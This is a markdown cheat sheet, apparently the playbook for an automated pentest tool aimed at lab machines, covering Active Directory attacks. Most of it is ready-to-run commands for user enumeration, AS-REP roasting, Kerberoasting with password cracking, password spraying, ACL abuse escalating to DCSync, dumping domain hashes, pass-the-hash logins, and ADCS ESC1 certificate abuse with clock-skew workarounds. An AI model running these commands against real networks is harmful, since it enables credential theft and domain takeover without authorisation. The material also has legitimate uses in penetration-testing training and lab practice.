# Active Directory

## Without credentials

```bash
pwnloop x "nxc smb $T"                                   # domain name, hostname, signing
pwnloop x "nxc smb $T -u '' -p '' --users --shares"
pwnloop x "nxc smb $T -u guest -p '' --rid-brute 4000"
pwnloop x "impacket-lookupsid anonymous@$T"              # user enumeration via SID bruteforce
pwnloop x "nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm='MACHINE.HTB',userdb=/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt $T"
```

Time skew breaks Kerberos. **Do not try to set the container's clock** — it has
no `CAP_SYS_TIME`, the clock belongs to the host kernel, and `ntpdate -u` will
measure the offset and then fail with `step_systime: Operation not permitted`.
Measure with `-q`, then shim the single process that needs it:

```bash
pwnloop x "ntpdate -q $T"                                  # read the offset only
pwnloop x "faketime \"\$(date -u -d '+7 hours 59 minutes 55 seconds' '+%F %T')\" <cmd>"
```

See the AD CS section below for the worked example — PKINIT is where this stops
being an annoyance and starts being a blocker.

## AS-REP roasting (no creds needed, just usernames)

```bash
pwnloop x "impacket-GetNPUsers machine.htb/ -usersfile users.txt -dc-ip $T -no-pass -format hashcat -outputfile /engagements/$NAME/loot/asrep.hash"
pwnloop x "john --wordlist=/usr/share/wordlists/rockyou.txt /engagements/$NAME/loot/asrep.hash"
```
Accounts with "do not require Kerberos preauthentication" hand you a crackable
hash for free.

## With any domain credential

```bash
pwnloop x "nxc smb $T -u user -p pass --shares --users --groups --pass-pol"
pwnloop x "nxc smb $T -u user -p pass -M spider_plus"
pwnloop x "impacket-GetUserSPNs machine.htb/user:pass -dc-ip $T -request -outputfile /engagements/$NAME/loot/kerberoast.hash"
pwnloop x "john --wordlist=/usr/share/wordlists/rockyou.txt /engagements/$NAME/loot/kerberoast.hash"
```
Kerberoastable service accounts with weak passwords are the classic path from
"any user" to "privileged user".

Password spraying — one password, every user, watching the lockout policy:
```bash
pwnloop x "nxc smb $T -u users.txt -p 'Password123' --continue-on-success"
```

## Enumerating ACL paths without a BloodHound GUI

```bash
pwnloop x "pip install bloodhound && bloodhound-python -u user -p pass -d machine.htb -dc dc.machine.htb -c All -ns $T"
```
That produces JSON you can grep directly for the interesting edges when no GUI
is available:
```bash
pwnloop x "grep -i 'GenericAll\|GenericWrite\|WriteDacl\|WriteOwner\|ForceChangePassword\|AddMember' /engagements/$NAME/loot/*.json | head -40"
```

### Two gotchas that waste time on a live DC

**A Windows access token is fixed at logon.** If you add yourself to a group or
grant yourself a right, the session you already hold does **not** gain it — you
need a fresh logon, which on Kerberos means a fresh TGT. The most reliable way to
act on a just-granted right is from Linux with impacket/`net rpc`, each command
re-authenticating with the password, rather than trying to use a WinRM/PowerShell
session that started before the change.

**Lab DCs run a reset job** that reverts state (group membership, ACLs) every few
minutes. Do not add a group, wander off to enumerate, and come back — the change
will be gone. Chain add + grant + use in one window:

```bash
# one window, each step re-auths fresh — beats both the token and the reset job
nxc x "net rpc group addmem 'Exchange Windows Permissions' myuser -U 'dom/myuser%pass' -S $T"
impacket-dacledit -action write -rights DCSync -principal myuser \
  -target-dn 'DC=dom,DC=local' 'dom/myuser:pass' -dc-ip $T
impacket-secretsdump 'dom/myuser:pass'@$T -just-dc-user Administrator
```

Prefer NTLM/password auth here. Kerberos adds `KRB_AP_ERR_SKEW` (DC clock drift),
and when it is unavoidable the fix is a `faketime` shim on that one command — not
`ntpdate -u`, which cannot step the container's clock. See above.

Common ACL abuses:
- `ForceChangePassword` on a user → reset their password with `net rpc password`
- `GenericAll` on a user → targeted Kerberoast (add an SPN) or password reset
- `GenericAll`/`GenericWrite` on a computer → resource-based constrained
  delegation, then impersonate an admin
- `AddMember` on a group → add yourself, inherit its rights
- `WriteDacl` on the domain → grant yourself DCSync

```bash
pwnloop x "net rpc password 'target-user' 'NewPass123!' -U 'machine.htb'/'you'%'yourpass' -S $T"
```

## DCSync and the domain

```bash
pwnloop x "impacket-secretsdump machine.htb/user:pass@$T -just-dc"
pwnloop x "impacket-psexec machine.htb/Administrator@$T -hashes :<nthash>"
pwnloop x "evil-winrm -i $T -u Administrator -H <nthash>"
```

## Certificate services (ADCS)

Vulnerable templates are a frequent modern path:
```bash
pwnloop x "certipy find -u user@machine.htb -p pass -dc-ip $T -vulnerable -stdout"
pwnloop x "certipy req -u user@machine.htb -p pass -ca CA-NAME -template VulnTemplate -upn administrator@machine.htb"
pwnloop x "certipy auth -pfx administrator.pfx -dc-ip $T"
```
ESC1 (enrollee-supplied subject) and ESC8 (NTLM relay to the web enrollment
endpoint) are the ones most often planted in labs.

**The signal that AD CS is worth checking** is `BUILTIN\Certificate Service
DCOM Access` appearing in a user's `whoami /all` output. Read the group list of
every Windows account you land as.

**ESC1 is four settings that must all be true** — confirm them in the
`certipy find` output rather than trusting the `[!] ESC1` tag: `Enrollee
Supplies Subject : True`, an EKU containing `Client Authentication`,
`Requires Manager Approval : False`, and enrolment rights held by a group you
are in (`Domain Users` is the give-away).

**`certipy auth` is PKINIT, so it is Kerberos, so clock skew kills it.**
`KRB_AP_ERR_SKEW` here is not a broken exploit. The container cannot step its
own clock (no `CAP_SYS_TIME` — the clock is the host kernel's), so `ntpdate -u`
fails with `step_systime: Operation not permitted`. Measure, then shim one
process:

```bash
pwnloop x "ntpdate -q $T"                     # read the offset, e.g. +28794 s
pwnloop x "faketime \"\$(date -u -d '+7 hours 59 minutes 55 seconds' '+%F %T')\" \
  certipy-ad auth -pfx administrator.pfx -dc-ip $T"
```

That returns a TGT and the account's NT hash; pass it to `evil-winrm -H` or
`netexec -H`. The certificate remains valid for its full lifetime regardless of
password resets, so **revoke it during cleanup** — request ID alone is not
accepted, `certutil -revoke` wants the serial:

```powershell
certutil -view -restrict "RequestId=<id>" -out "SerialNumber"
certutil -revoke <serial> 4                     # 4 = superseded
certutil -view -restrict "RequestId=<id>" -out "RequestId,Request.Disposition"
# verify: Request Disposition: 0x15 (21) -- Revoked
```
